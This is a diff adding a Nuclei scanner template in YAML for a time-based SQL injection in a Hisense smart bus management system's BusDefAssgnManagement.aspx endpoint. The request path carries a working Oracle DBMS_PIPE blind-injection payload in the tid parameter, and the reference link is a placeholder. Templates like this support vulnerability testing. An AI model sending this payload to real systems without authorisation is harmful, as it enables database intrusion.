@@ -1,0 +1,32 @@
+id: hisense-bus-system-sqli
+
+info:
+  name: 海信智能公交企业管理系统 SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    海信智能公交企业管理系统的BusDefAssgnManagement.aspx接口存在基于时间的SQL注入漏洞，
+    攻击者可通过tid参数利用DBMS_PIPE.RECEIVE_MESSAGE函数进行时间盲注。
+  reference:
+    - https://example.com/hisense-sqli-details  # 替换为实际参考链接
+  tags: 海信智能公交企业管理系统
+
+requests:
+  - method: GET
+    path: 
+      - "{{BaseURL}}/YZSoft/Forms/XForm/BM/MaintainceManagement/BusDefAssgnManagement.aspx?tid=1+AND+3536=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(101)||CHR(88)||CHR(83),3)--+FjHn"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=3 && duration<8"
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SQL"
+        part: body
